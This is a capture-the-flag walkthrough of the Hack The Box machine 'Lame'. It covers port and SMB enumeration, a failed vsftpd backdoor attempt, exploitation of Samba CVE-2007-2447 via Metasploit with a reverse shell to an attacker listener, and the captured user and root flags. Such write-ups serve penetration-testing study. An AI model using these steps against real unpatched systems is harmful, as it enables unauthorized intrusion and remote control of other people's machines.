# HTB: Lame

## 🔍 Enumeration
```bash
nmap -p- --min-rate=1000 -T4 10.10.10.3
```
**Results:**
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

### SMB Enumeration
```bash
smbmap -H 10.10.10.3
```
**Results:**
```
[+] IP: 10.10.10.3:445	Name: 10.10.10.3          	Status: Authenticated
	Disk    | Permissions | Comment
	--------|-------------|--------------------------
	print$  | NO ACCESS   | Printer Drivers
	tmp     | READ, WRITE | oh noes!
	opt     | NO ACCESS   | 
	IPC$    | NO ACCESS   | IPC Service (Samba 3.0.20-Debian)
	ADMIN$  | NO ACCESS   | IPC Service (Samba 3.0.20-Debian)
```

```bash
smbclient -N \\10.10.10.3\tmp
```
Successfully connected and browsed the `tmp` share.

---

## 💥 Exploitation

### FTP – Vsftpd 2.3.4 (CVE-2011-2523)
- **Exploit Used:** `exploit/unix/ftp/vsftpd_234_backdoor`
- **Outcome:** Not exploitable — port 6200 blocked by firewall.

### SMB – Samba 3.0.20-Debian (CVE-2007-2447)
- **Exploit Used:** `exploit/multi/samba/usermap_script`  
- **Vulnerability:** Username map script command execution  
- **Payload:** Reverse TCP shell via Metasploit

```bash
msf6 > use exploit/multi/samba/usermap_script
```
```
[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.10.3:43580)
```

## ⚙️ Privilege Escalation
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
id
uid=0(root) gid=0(root)
```

**Flags:**
```bash
cat /home/makis/user.txt
e95ac31f8132e26eac44c2fe58792cfa

cat /root/root.txt
4f8f2ae18815f97ffdf7975965d6b624
```

---

## 🛠️ Tools Used
- `nmap`, `smbmap`, `smbclient`, `metasploit`, `searchsploit`, `nc`, `netstat`

---

## 🧠 Key Takeaways
- Exploiting outdated Samba services is still viable on legacy boxes.
- Port filtering can block shell return paths even if a vuln exists (FTP port 6200).
- Always enumerate SMB shares even without creds — `smbclient` often provides an initial foothold.
- Samba CVE-2007-2447 is a classic — worth mastering for CTFs and exams like OSCP.